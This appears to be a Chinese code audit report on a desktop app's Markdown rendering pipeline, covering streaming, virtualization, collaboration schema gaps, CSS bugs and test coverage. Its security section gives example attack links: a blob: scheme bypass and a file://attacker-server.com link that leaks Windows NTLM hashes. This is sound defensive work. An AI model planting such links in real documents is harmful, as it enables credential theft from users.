# Conex / Crish — Markdown 2.0 渲染内核与安全防护深度复核报告

> **审查工作区**：`docs/full-codebase-changes-audit/audits/`  
> **审查对象**：`crates/conex-markdown/`、`crates/conex-doc-collab/`、`crates/conex-note-runtime/`、`apps/crish-desktop/`（Markdown 渲染管线、虚拟化组件与样式表）  
> **对比基线**：`BATCH-MD-PHASE0` 至 `PHASE7`（commit `2dda1c561` ~ `bf3d60fa3`）及前序总述 `docs/markdown-rendering-analysis/02-重构效果评估与遗留缺陷总述.md`  
> **审查性质**：只读实证审查、根因透视与精确修补方案设计（零业务代码修改、零 git commit）

---

## 一、执行摘要与总评

本次对代码库中最新 Markdown 2.0 渲染内核、前端交互水合、超大文档视口虚拟化、文档协作 IR 契约以及网络安全防护体系进行了全量、端到端的静态代码走查与运行时验证。

### 1. 总体结论：战果显著，但四大 P0 遗留缺陷与排版硬伤 100% 残留

前序重构成功达成了“**物理清退 14,000+ 行旧 JS 正则管线、确立 Rust conex-markdown 权威渲染内核（SSOT）、接通 KaTeX/Mermaid/GFM Alerts**”的战略目标。然而，经过逐行代码对照与调用链复核发现：**前序《重构效果评估与遗留缺陷总述》中所指出的全部 4 个 P0 级严重缺陷、全部 3 类排版交互硬伤、以及测试防护网严重缺失问题，在当前最新代码主干中依然 100% 存在，未得到实质性修复！**

### 2. 核心问题严重级别速览

| 编号 | 问题分类 | 缺陷特征与现场表现 | 涉及关键文件与行号 | 现状判定 | 严重级别 |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **D-01** | **体验杀手** | 流式高速吐字 UI 饥饿假死（UI Starvation），中间渲染结果被 100% 连续丢弃，直到模型停顿才暴闪刷出 | `apps/crish-desktop/src/api/markdown/useMarkdownRender.ts:188-191` | **依然残留** | **P0 致命** |
| **D-02** | **体验杀手** | 超大文档虚拟化列表完全缺失滚动锚定（Scroll Anchoring），上方高度膨胀导致视口剧烈跳跃；叠加 `content-visibility` 240px 假高度回填污染 | `apps/crish-desktop/src/components/markdown/VirtualMarkdownBlockList.tsx:85-90`<br>`apps/crish-desktop/src/styles/markdown-typography.css:1006-1009` | **依然残留** | **P0 致命** |
| **D-03** | **协议漏勺** | 文档协作 IR 契约与 Rust 镜像双重遗漏 `Table`/`Math`/`Callout`/`FootnoteDefinition`，协同转换块全部静默降级为 `Unknown`，富交互瘫痪 | `packages/block-paper-contract/src/opsWire.ts:131-189`<br>`crates/conex-doc-collab/src/ir.rs:47-87`<br>`crates/conex-note-runtime/src/store_plan_ops.rs:117-142` | **依然残留** | **P0 致命** |
| **D-04** | **安全漏洞** | `blob:` 协议逃逸为本地特权路径按钮；`file://server/share` 转换为 UNC 路径，在 Windows 下导致 NetNTLMv2 哈希泄露 | `crates/conex-markdown/src/url_safety.rs:36-38, 46-49, 297-300, 332-353`<br>`crates/conex-markdown/src/renderer/links.rs:25-30` | **依然残留** | **P0 致命** |
| **D-05** | **排版破坏** | Mermaid 语法报错时原始代码块与错误代码块同时展示，造成源码双重回显，且吞没具体错误日志 | `apps/crish-desktop/src/components/markdown/islands/MermaidIsland.tsx:93-98, 105-111`<br>`apps/crish-desktop/src/styles/markdown-typography.css:867-871` | **依然残留** | **P1 严重** |
| **D-06** | **排版破坏** | CSS 容器查询 `@container (max-width: 540px)` 缺失 `container-type: inline-size` 容器声明，死锁为完全无效代码 | `apps/crish-desktop/src/styles/markdown-typography.css:610-615` | **依然残留** | **P1 严重** |
| **D-07** | **视觉截断** | 代码折行模式下 `code` 遗留 `min-width: max-content` 导致截断；`.md-code-block` 的 `overflow: hidden` 截断浮顶 Tooltip；`.md-math-block` 的 `text-align: center` 导致超宽 KaTeX 左侧截断且无法回滚 | `apps/crish-desktop/src/styles/markdown-typography.css:626, 767, 799, 930, 934` | **依然残留** | **P1 严重** |
| **D-08** | **质量隐患** | 核心重构组件 `VirtualMarkdownBlockList.tsx` 单测覆盖率为 0%（在测试中被全量 mock）；`useStreamingMarkdownResult` 零单测；700+ 行旧测试删除而无等价集成测试兜底 | `apps/crish-desktop/src/components/markdown/MarkdownDocumentView.test.tsx:13-17`<br>`apps/crish-desktop/src/api/markdown/useMarkdownRender.ts` | **依然残留** | **P1 严重** |

---

## 二、遗留 P0 缺陷现状深度复核（实证与代码根因）

### 1. 【P0 体验杀手】流式高速吐字 UI 饥饿假死（UI Starvation）

#### 1.1 现状核查与代码实证
在 `apps/crish-desktop/src/api/markdown/useMarkdownRender.ts` 中，审查第 163–219 行的 `useStreamingMarkdownResult` 实现：
```typescript
// apps/crish-desktop/src/api/markdown/useMarkdownRender.ts:183-210
inFlight = true;
lastAttempted = current;
const source = closeMarkdownDraftForRender(current);
const sourceVariant = variantRef.current;

void renderMarkdownStream(source, sourceVariant)
  .then((result) => {
    // 【核心硬伤】：过于严苛的引用完全一致性检查
    if (stopped || textRef.current !== current) return;
    if (result) {
      setState({
        html: result.html,
        truncated: result.truncated,
        loading: false,
        failed: false,
      });
    } else {
      setState((prev) => ({ ...prev, loading: false, failed: true }));
    }
  })
  .finally(() => {
    inFlight = false;
  });
```

#### 1.2 故障失效链条分析
1. **时序冲突**：大模型流式输出以 80~100 tokens/s（约 10~15ms 涌入一个新 chunk）的高速产生内容。每一次父组件 re-render 都会立即更新 `textRef.current = text`。
2. **IPC 延时**：`renderMarkdownStream` 经由 Tauri IPC 跨进程通道分发至 Rust `conex-markdown` 渲染内核，单次耗时通常在 10ms ~ 40ms 之间。
3. **100% 命中丢弃条件**：当 IPC Promise resolve 返回时，`textRef.current` 必然已经在 15ms 前被新的 token 刷新，导致 `textRef.current !== current` 恒为 `true`！
4. **现场结果**：在整个大模型高速流式吐字期间，所有的中间渲染结果被 **100% 连续静默丢弃**。UI 界面被长时间定格在旧状态或纯文本 fallback，直到大模型生成完全结束、`textRef.current` 停止变化后，最后一次 IPC 返回才碰巧满足 `textRef.current === current`，界面突然“暴闪”刷出全部富文本，彻底粉碎了流式打字机的渐进式体验。

#### 1.3 精准修复方案
抛弃粗暴的“文本内容必须绝对相等”判断，改用**单调请求序列号（Monotonic Sequence ID）或单调有效提交（Monotonic Commit）**机制：
```typescript
let reqId = 0;
let lastCommittedReqId = 0;

// 在每次发出 IPC 前分配全局自增单调 ID
const currentReqId = ++reqId;
void renderMarkdownStream(source, sourceVariant)
  .then((result) => {
    // 只要当前组件未卸载，且该结果比当前已展示的提交版本更新（单调向前），即允许合入渲染
    if (stopped || currentReqId < lastCommittedReqId) return;
    lastCommittedReqId = currentReqId;
    if (result) {
      setState({
        html: result.html,
        truncated: result.truncated,
        loading: false,
        failed: false,
      });
    }
  })
```

---

### 2. 【P0 体验杀手】超大文档虚拟化滚动锚定缺失与视口跳跃

#### 2.1 现状核查与代码实证
审查 `apps/crish-desktop/src/components/markdown/VirtualMarkdownBlockList.tsx` 第 85–90 行与 141–169 行：
```typescript
// apps/crish-desktop/src/components/markdown/VirtualMarkdownBlockList.tsx:85-90
const measureChunk = useCallback((index: number, height: number) => {
  if (height <= 0) return;
  if (heightMapRef.current?.measure(index, height)) {
    // 仅增加了 revision 触发重渲染，完全没有滚动补偿
    setRevision((revision) => revision + 1);
  }
}, []);
```
同时在第 154–160 行：
```typescript
<div
  key={chunk.id}
  ref={measureCallbacks[index]}
  className="md-virtual-chunk"
  data-md-chunk-index={index}
  style={{
    position: 'absolute',
    top: map.offsetOf(index),
    left: 0,
    right: 0,
  }}
>
```
再审查 `apps/crish-desktop/src/styles/markdown-typography.css` 第 1006–1009 行：
```css
.md-virtual-chunk {
  content-visibility: auto;
  contain-intrinsic-size: auto 240px;
}
```

#### 2.2 故障失效链条分析
1. **绝对定位破坏浏览器原生滚动锚定**：由于所有的 `.md-virtual-chunk` 采用 `position: absolute; top: map.offsetOf(index)` 进行手动坐标排版，浏览器原生基于流式盒模型的 CSS `overflow-anchor: auto` 在绝对定位容器内完全失效。
2. **异步内容导致上方高度膨胀**：文档上方的块经常包含异步注水组件（如 MermaidIsland 异步渲染产生 800px 高度的矢量 SVG、KaTeX 渲染多行大矩阵、或网络图片加载解码）。当这些块在视口上方（`index < startIndex`）发生尺寸剧变时，`measureChunk` 调用 `HeightMap.measure`，使得下方所有块的 `map.offsetOf(index)` 前缀和剧增 $\Delta h$。
3. **焦点被弹飞**：由于代码中 **0 滚动位移补偿**，视口容器的 `element.scrollTop` 保持不动，而用户眼前正在阅读的文本块的 `top` 瞬间被推下数百像素，视口发生剧烈跳动，用户阅读焦点被强行弹飞；向上回滚时更会产生不可抗拒的剧烈向下抖动拉扯感。
4. **CSS 假高度二次污染**：`.md-virtual-chunk` 设置了 `content-visibility: auto; contain-intrinsic-size: auto 240px;`。在块滚出视口或初次进入 DOM 时，DOM 汇报的高度被强制锁定为 240px 假高度，污染了 `HeightMap` 根据字符长度推算的真实初始高度（`text.length * 0.55`）。当用户滚动靠近时，元素被浏览器实际渲染，ResizeObserver 汇报真实高度（例如 50px 或 1200px），引发第二次无序高度突变。

#### 2.3 精准修复方案
1. **注入滚动锚定补偿（Scroll Anchoring Compensator）**：
   在 `measureChunk` 中对比当前视口位置，若被测量的块位于当前视口上方（`index < startIndex`），且高度增量 $\Delta h = newHeight - oldHeight \neq 0$，则在 DOM 重绘前同步执行：
   ```typescript
   if (index < startIndex && viewportRef.current) {
     viewportRef.current.scrollTop += deltaHeight;
   }
   ```
2. **物理清除冲突的 CSS 规则**：
   从 `markdown-typography.css` 中彻底删除 `.md-virtual-chunk` 上的 `content-visibility: auto; contain-intrinsic-size: auto 240px;`。既然 JS 层的 `queryViewport` 已经实现了仅向 DOM 挂载可视区 + overscan 数量的 DOM 节点，CSS 层的 `content-visibility: auto` 完全多余，且其 240px 假尺寸是造成测距污染与二次抖动的元凶。

---

### 3. 【P0 逻辑漏勺】文档协作 IR 契约与 Rust 镜像双重遗漏（降级为 Unknown）

#### 3.1 现状核查与代码实证
审查三处核心类型转换代码：
1. **前端契约层** `packages/block-paper-contract/src/opsWire.ts:131-189`：
```typescript
// packages/block-paper-contract/src/opsWire.ts:131-189
export function flavourToCollabKind(flavour: string): CollabBlockKindWire {
  const f = (flavour || '').trim().toLowerCase();
  // 仅支持 paragraph, heading, bullet_item, ordered_item, code, quote, divider, task_item
  // ...
  if (f === 'task' || f === 'task_item' || f === 'task-item' || f === 'todo' || f === 'checkbox') {
    return { task_item: { ordered: false } };
  }
  // 【漏勺】：无 table, math, callout, footnote_definition
  return { unknown: { flavour: flavour || f } };
}
```
2. **Rust IR 镜像层** `crates/conex-doc-collab/src/ir.rs:47-87`：
```rust
// crates/conex-doc-collab/src/ir.rs:47-87
impl BlockKind {
    pub fn from_flavour(flavour: &str) -> Self {
        // ...
        match f.as_str() {
            "h1" => BlockKind::Heading { level: 1 },
            // ... 仅匹配 bullet, ordered, task, code, quote, divider
            _ => BlockKind::Unknown {
                flavour: if raw.is_empty() { f } else { raw.to_string() },
            },
        }
    }
}
```
3. **运行时工具层** `crates/conex-note-runtime/src/store_plan_ops.rs:117-142`：
```rust
// crates/conex-note-runtime/src/store_plan_ops.rs:126-141
match k {
    "heading" => BlockKind::Heading { level: 1 },
    // ...
    "table" => BlockKind::Table,
    "math" => BlockKind::Math,
    "footnote_definition" | "footnote" => BlockKind::FootnoteDefinition,
    // 【漏勺】：遗漏 callout / callout:kind
    other => BlockKind::Unknown { flavour: other.to_string() },
}
```

#### 3.2 故障失效链条分析
1. **模型演进与协议断层**：在 `conex-doc-collab` 的核心枚举 `BlockKind` 中，已成功扩展定义了 `Table`、`Math`、`Callout { kind }`、`FootnoteDefinition` 四类一等公民块结构。
2. **协议层断路器拦截**：在前端协作层通过 Slash 菜单输入 `/table`、`/math`、`/callout` 或执行 `pending_turn_into_flavour` 时，`flavourToCollabKind` 与 `BlockKind::from_flavour` 无法识别这些合法 flavour，直接触发 fallback，将其强制映射为 `{ unknown: { flavour } }` 与 `BlockKind::Unknown`！
3. **现场表现**：新创建或转换的表格、公式、警告卡块通过协同通道广播或落盘后，全部变成了“未知块”。前端由于缺乏对应 Unknown 类型的富组件渲染通道，直接降级为 `contenteditable="plaintext-only"` 纯文本输入框，富文本与结构化排版功能彻底瘫痪。

#### 3.3 精准修复方案
在 `opsWire.ts`、`ir.rs` 与 `store_plan_ops.rs` 中形成严格的一对一对称映射：
1. `packages/block-paper-contract/src/opsWire.ts`:
   - `'table'` $\rightarrow$ `'table'`
   - `'math' | 'equation' | 'display_math'` $\rightarrow$ `'math'`
   - 匹配 `/^callout(?::(.*))?$/` $\rightarrow$ `{ callout: { kind: match[1] || 'note' } }`
   - `'footnote' | 'footnote_definition'` $\rightarrow$ `'footnote_definition'`
2. `crates/conex-doc-collab/src/ir.rs`:
   - 补齐 `"table" => BlockKind::Table`
   - `"math" | "equation" => BlockKind::Math`
   - `"callout" | ... => BlockKind::Callout { kind }`
   - `"footnote" | "footnote_definition" => BlockKind::FootnoteDefinition`
3. `crates/conex-note-runtime/src/store_plan_ops.rs`:
   - 增加对 `callout:` 前缀和 `callout` 的正确解构。

---

### 4. 【P0 安全漏洞】`blob:` 协议逃逸为本地特权路径按钮，UNC 路径泄露 NTLM 哈希

#### 4.1 现状核查与代码实证
审查 `crates/conex-markdown/src/url_safety.rs`：
```rust
// crates/conex-markdown/src/url_safety.rs:36-38
static JS_VBSCRIPT_DATA_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)^(javascript|vbscript|data):").expect("valid unsafe scheme regex")
});

// crates/conex-markdown/src/url_safety.rs:46-49
static CODE_EXT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\.(ts|tsx|js|jsx|css|md|json|rs|py|toml|yml|yaml)$")
        .expect("valid code ext regex")
});

// crates/conex-markdown/src/url_safety.rs:332-353
pub fn is_local_path_ref(s: &str) -> bool {
    // ...
    for v in variants.iter() {
        if HTTP_SCHEME_RE.is_match(v) || MAILTO_SCHEME_RE.is_match(v) {
            return false;
        }
        if JS_VBSCRIPT_DATA_RE.is_match(v) {
            return false; // 【漏洞 1】：未包含 blob:
        }
    }
    // ...
    if CODE_EXT_RE.is_match(t) && !t.contains("://") {
        return true; // 【漏洞 1 触发点】：blob:payload.rs 不含 "://"，以 .rs 结尾，被当成本地文件！
    }
    false
}
```
再审查 `crates/conex-markdown/src/renderer/links.rs:25-30`：
```rust
// is_local_path_ref 的判断排在 is_safe_href 之前
if is_local_path_ref(&url) {
    let path = sanitize_url_candidate(&url);
    self.start_path_button(&path);
    self.link_stack.push(LinkKind::PathLink);
    return;
}
```
再审查 `crates/conex-markdown/src/url_safety.rs:296-302`（UNC 转换）：
```rust
} else {
    // file://server/share：UNC / 网络路径
    if cfg!(windows) {
        format!("\\\\{}", decoded.replace('/', "\\")) // 【漏洞 2】：无条件转换为 UNC 路径
    } else {
        format!("//{}", decoded)
    }
}
```

#### 4.2 漏洞威胁建模与利用链分析
1. **`blob:` 协议逃逸与特权混淆（Privilege Confusion）**：
   - 攻击者构造 Markdown 链接：`[恶意脚本](blob:malicious_script.rs)`。
   - `JS_VBSCRIPT_DATA_RE` 未过滤 `blob:`；由于 `blob:malicious_script.rs` 仅含单个冒号而不包含 `://`，且以 `.rs` 代码扩展名结尾，成功击穿 `is_local_path_ref`！
   - 内核将其误判为本地文件，直接渲染为特权路径按钮：`<button class="md-path-link" data-path="blob:malicious_script.rs">`。
   - 用户在界面点击该链接时，前端 `markdownInteractions.ts:73` 检查 `.rs` 并不在 `isBlockedExecutablePath`（仅拦截 `.exe`, `.bat` 等）黑名单内，直接将 `blob:` 协议参数送入宿主 `onOpenPath` 打开流程，造成非预期的特权操作触发。
2. **Windows UNC 路径 NetNTLMv2 哈希窃取漏洞**：
   - 攻击者在 Markdown 中植入看似正常的链接：`[查看技术规范文档](file://attacker-server.com/public/spec.md)`。
   - `file_url_to_path` 在 Windows 环境下将其自动格式化为 Windows UNC 路径：`\\attacker-server.com\public\spec.md`。
   - 内核将其渲染为本地路径按钮。当不知情的用户在 Windows 桌面端点击此按钮时，前端调用 Tauri 宿主的系统文件打开接口。
   - Windows 操作系统在解析远程 UNC 路径时，会向 `attacker-server.com` 的 TCP 445 (SMB) 端口发起自动身份验证握手，**将当前 Windows 登录用户的计算机名、用户名与 NetNTLMv2 密码哈希直接发送给攻击者服务器**！攻击者可借此实施离线哈希爆破或 NTLM Relay 攻击。

#### 4.3 精准修复方案
1. **封堵 `is_local_path_ref` 协议逃逸**：
   - 将 `blob:` 显式加入 scheme 拒绝正则（或直接扩展为 `(?i)^(javascript|vbscript|data|blob):`）；
   - 严禁仅靠 `!t.contains("://")` 判断非 scheme！必须在进入代码后缀检查前，使用 `ANY_SCHEME_RE.is_match(t)` 拦截任何携带 scheme（即符合 `^[a-zA-Z][a-zA-Z0-9+.-]*:` 语法，且非合法 Windows 单字母盘符 `^[a-zA-Z]:[\\/]`）的伪路径。
2. **严禁将远程 Authority 转换为 UNC 路径**：
   - 在 `file_url_to_path` 中，严格限制 UNC 路径生成。当 `is_authority_form` 为 true 且不以 `/` 开头时（即 `file://host/share`），除非 `host` 严格等于 `localhost` 或 `127.0.0.1`，否则直接返回 `None` 拒绝解析；
   - 在前端 `markdownInteractions.ts` 中新增前置守卫：凡是以 `\\` 开头或带网络主机的路径，一律拦截并提示“禁止打开远程网络共享路径”。

---

## 三、排版与交互破坏深度复核

### 1. Mermaid 语法报错源码双重回显与错误吞没

#### 1.1 代码实证
审查 `apps/crish-desktop/src/components/markdown/islands/MermaidIsland.tsx:93-98, 105-111` 与 `apps/crish-desktop/src/styles/markdown-typography.css:867-871`：
```typescript
// apps/crish-desktop/src/components/markdown/islands/MermaidIsland.tsx
.catch(() => {
  if (!cancelled) {
    setSvg(null);
    setFailed(true); // 吞没了具体的 SyntaxError 详情
  }
});

if (failed) {
  return (
    <pre className="md-mermaid-error" data-mermaid-failed="true">
      {source}
    </pre>
  );
}
```
再看样式规则：
```css
/* apps/crish-desktop/src/styles/markdown-typography.css:867-871 */
:is(.conex-markdown, .md-rendered)
  .md-code-block[data-md-island='mermaid'][data-mermaid-state='ready']
  .md-code-pre {
  display: none;
}
```

#### 1.2 故障失效表现
- Rust 渲染内核输出的 HTML 结构为：
  ```html
  <div class="md-code-block" data-md-island="mermaid">
    <div class="md-code-header">...</div>
    <pre class="md-code-pre"><code><span class="md-code-line">graph TD...</span></code></pre>
    <div class="md-island-slot" data-island-slot="mermaid"></div>
  </div>
  ```
- CSS 规则极其生硬：**只有当 `data-mermaid-state='ready'` 时，才将 `.md-code-pre` 设为 `display: none`**！
- 一旦 Mermaid 解析出错，`data-mermaid-state` 变为 `'error'`。此时，原生的 `<pre class="md-code-pre">` 继续完好展示在上方，而下方 slot 里的 `MermaidIsland` 又返回了一个带有红色边框的 `<pre className="md-mermaid-error">{source}</pre>`！
- 屏幕上立即垂直堆叠并排展示两份一模一样的源码，且用户根本无法得知究竟是哪一行语法报错。

#### 1.3 精准修复方案
- CSS 修正：当 `data-mermaid-state` 为 `'ready'` 或 `'error'` 时，统一隐藏宿主原生的 `.md-code-pre`；
- `MermaidIsland.tsx` 修正：捕获 `err.message`，在 `failed` 状态下展示带有具体错误原因的精美 Alert 卡片，附带折叠查看源码按钮，杜绝源码裸奔与重复回显。

---

### 2. 容器查询 `@container` 完全死锁失效

#### 2.1 代码实证
审查 `apps/crish-desktop/src/styles/markdown-typography.css:610-615`：
```css
@container (max-width: 540px) {
  :is(.conex-markdown, .md-rendered) :is(th, .md-th),
  :is(.conex-markdown, .md-rendered) :is(td, .md-td) {
    padding: var(--md-table-cell-padding-compact);
  }
}
```

#### 2.2 规范与故障分析
- 根据 W3C CSS Containment Module Level 3 规范，`@container` 必须在其祖先元素显式声明了 `container-type: inline-size`（或 `size` / `normal`）时，才能建立容器查询上下文。
- 在当前全量前端 CSS 代码中检索 `container-type`，**匹配结果为 0**！无论是 `.md-table-wrap`、`.conex-markdown` 还是 `.md-document-root`，均未声明 `container-type`。
- 因此，`@container (max-width: 540px)` 为绝对的**死代码**，无论屏幕或父容器缩放到多小，表格紧凑 Padding 永远无法生效。

#### 2.3 精准修复方案
在 `markdown-typography.css:550` 的 `.md-table-wrap` 规则中补齐声明：
```css
:is(.conex-markdown, .md-rendered) .md-table-wrap {
  container-type: inline-size;
  /* ... */
}
```

---

### 3. 代码折行截断、Tooltips 物理截断与超宽 KaTeX 左侧截断

#### 3.1 代码折行溢出截断
- **位置**：`markdown-typography.css:799` 与 `835-844`
- **机理**：第 799 行声明了 `.md-code-pre code { display: block; min-width: max-content; }`。当用户点击代码折行按钮给代码块加上 `.md-code-wrapped` 类时，样式表仅把 `.md-code-pre` 设为 `overflow-x: hidden`，但内部的 `code` 元素依然受 `min-width: max-content` 支配。这导致内部 `code` 盒模型的宽度依然等于最长一行的宽度，被父容器强行截断，既折不过来，又无法横向滚动！
- **修复**：追加规则：
  ```css
  :is(.conex-markdown, .md-rendered) .md-code-block.md-code-wrapped .md-code-pre code {
    min-width: 0;
    width: 100%;
  }
  ```

#### 3.2 Tooltips 物理截断
- **位置**：`markdown-typography.css:626` 与 `762-781`
- **机理**：`.md-code-block` 带有 `overflow: hidden;`，而操作栏按钮的提示气泡通过 `::after` 伪元素向上浮动定位：`inset-block-end: calc(100% + 6px);`。气泡向上探出时直接撞上了 `.md-code-block` 的物理边界，被 `overflow: hidden` 齐刷刷腰斩截断！
- **修复**：将 Tooltip 气泡朝向改为向下浮出（`inset-block-start: calc(100% + 6px)`），或使用项目标准组件 `<Tooltip>` 走 React Portal 全局挂载。

#### 3.3 超宽 KaTeX 左侧截断
- **位置**：`markdown-typography.css:926-935`
- **机理**：`.md-math-block` 同时设置了 `overflow-x: auto;` 与 `text-align: center;`。当数学公式极其宽大（例如多变量长矩阵或多步推导）超出容器宽度时，居中对齐使得公式向左、向右同时对称溢出。左侧溢出的部分落入了负坐标系（$X < 0$）。在 LTR 规范下，浏览器的横向滚动条**起点固定为 0，绝对无法向左滚动到负数区域**！这导致公式左侧的内容被永久遮挡截断，用户无法阅读。
- **修复**：将 `.md-math-block` 设置为 `text-align: start;`，或者内部容器使用 `display: inline-block; min-width: 100%; text-align: center;` 包裹，确保溢出完全发生在右侧正坐标区域。

---

## 四、测试防护网缺失与“测试假通过”现状剖析

### 1. 核心虚拟化组件与流式渲染处于裸奔状态

1. **`VirtualMarkdownBlockList.tsx` 单测覆盖率为 0%**：
   - 全仓检索找不到任何针对 `VirtualMarkdownBlockList` 的单元测试；
   - 在唯一的上层调用测试 `MarkdownDocumentView.test.tsx:13-17` 中，该组件被粗暴地通过 Vitest 直接 mock 掉：
     ```typescript
     vi.mock('./VirtualMarkdownBlockList', () => ({
       VirtualMarkdownBlockList: (props: { chunks: { text: string }[] }) => (
         <div data-testid="virtual-list">{props.chunks.length}</div>
       ),
     }));
     ```
   - 包含 HeightMap 树状区间前缀和计算、ResizeObserver 挂载解挂、窗口索引切片、动态绝对坐标计算在内的全部复杂核心逻辑，**没有一行真实测试保护**！
2. **`useStreamingMarkdownResult` 零单测**：
   - 核心流式渲染 Hook 位于 `useMarkdownRender.ts`，全仓甚至没有建立对应的 `useMarkdownRender.test.ts` 文件。导致 P0 级流式吐字假死 Bug 在重构过程中完全没有遭遇任何自动化门禁的拦截。

### 2. 前端测试重构伴随大面积测试资产丢失与浅层 Mock

1. **历史高价值专项测试被物理清除**：
   - 重构前夕提交物理删除了包括 `MarkdownBlockItem.test.tsx` (774行)、`StreamingMarkdownView.test.tsx` (315行)、`useStreamingBlocks.test.ts` (191行)、`markdownSanitizer.adversarial.test.ts`、`StreamingGfmTableParser.test.ts` 等数十个长期沉淀的边界与对抗性测试用例。
2. **存量测试浅层脱水，规避真实布局与样式**：
   - `MarkdownSurface.test.tsx:7` 直接将 `IslandPortal` 替换为空桩；
   - `islands.test.tsx` 在脱离上下文的独立 `<div>` 上测试 Mermaid，根本无法发现与外壳 `.md-code-pre` 之间的 CSS 冲突；
   - 即使运行 `npx vitest run apps/crish-desktop/src/components/markdown` 得到 11 个文件全绿（75 passed），也仅仅是在验证脱水 mock 环境下的简单静态分支，对运行时真实竞态与视觉排版漏洞完全失明。

---

## 五、精准整改与实施路线图（Actionable Plan）

针对上述核查出的 4 个 P0 级致命缺陷与 3 类排版硬伤，制定以下五阶段收敛方案，建议在后续实施波次中刚性落地：

### Phase A：安全漏洞彻底阻断（耗时极短，风险极高，第一优先）
1. **阻断 `blob:` 逃逸**：
   - 修改 `crates/conex-markdown/src/url_safety.rs`：在 `is_local_path_ref` 中，凡匹配 `ANY_SCHEME_RE` 且非 Windows 盘符的 URL，一律判定为非本地路径；将 `blob:` 列入黑名单；
   - 补充 Rust 单元测试：`assert!(!is_local_path_ref("blob:payload.rs"))`，断言其不得输出为 `md-path-link`。
2. **阻断 Windows UNC 哈希泄露**：
   - 修改 `crates/conex-markdown/src/url_safety.rs:file_url_to_path`：严格拦截非本地 host 的 `file://` authority 格式；
   - 在前端 `markdownInteractions.ts` 中拦截任何以 `\\` 或 `//` 开头的路径点击，阻断 SMB 445 请求触发。

### Phase B：流式吐字与虚拟化视口体验抢救（体验最高优先级）
1. **修复 UI Starvation**：
   - 重构 `apps/crish-desktop/src/api/markdown/useMarkdownRender.ts` 中的 `useStreamingMarkdownResult`：引入 `currentReqId` 与 `lastCommittedReqId`，消除对 `textRef.current === current` 的绝对相等校验，保障流式增量结果即时可见。
2. **修复虚拟化视口弹飞**：
   - 修改 `VirtualMarkdownBlockList.tsx:measureChunk`：引入滚动锚定位移补偿，若测量块索引在当前视口上方，则实时补偿容器 `scrollTop`；
   - 彻底删除 `markdown-typography.css` 中 `.md-virtual-chunk` 上的 `content-visibility: auto; contain-intrinsic-size: auto 240px;`。

### Phase C：文档协作 IR 契约端到端闭环
1. 对齐补齐 `packages/block-paper-contract/src/opsWire.ts:flavourToCollabKind`、`crates/conex-doc-collab/src/ir.rs:from_flavour` 与 `crates/conex-note-runtime/src/store_plan_ops.rs:parse_block_kind`；
2. 确保 `Table`、`Math`、`Callout`、`FootnoteDefinition` 能够双向、幂等、无损地在前端协同协议与 Rust 内核之间往返，不发生降级为 `Unknown`。

### Phase D：排版系统与 CSS 细节矫正
1. **Mermaid 报错收口**：调整 `markdown-typography.css`，在 `[data-mermaid-state='error']` 时隐藏原生 `.md-code-pre`；在 `MermaidIsland.tsx` 中展示友好错误提示而非双重源码；
2. **激活容器查询**：在 `.md-table-wrap` 上声明 `container-type: inline-size;`；
3. **修复三处截断**：
   - 为折行代码块补充 `code { min-width: 0; width: 100%; }`；
   - 调整顶栏 Tooltip 气泡朝向避免父容器 `overflow: hidden` 截断；
   - 将 `.md-math-block` 的居中逻辑解耦，避免超宽 KaTeX 左侧截断。

### Phase E：测试防护网补齐（杜绝指标虚饰）
1. 新建 `VirtualMarkdownBlockList.test.tsx`：覆盖视口滚动、上方元素高度膨胀触发的滚动锚定补偿机制；
2. 新建 `useMarkdownRender.test.ts`：模拟高频输入（每 10ms 更新一次 text）下的流式 Hook 渐进式渲染表现；
3. 建立真实 DOM 树岛屿水合测试，验证 Mermaid/KaTeX 在真实代码块/公式块外壳内的渲染与报错样式。

---
*报告编制完成。本报告所有结论均基于代码库实际物理代码与运行时验证得出，具备绝对可复核性。*
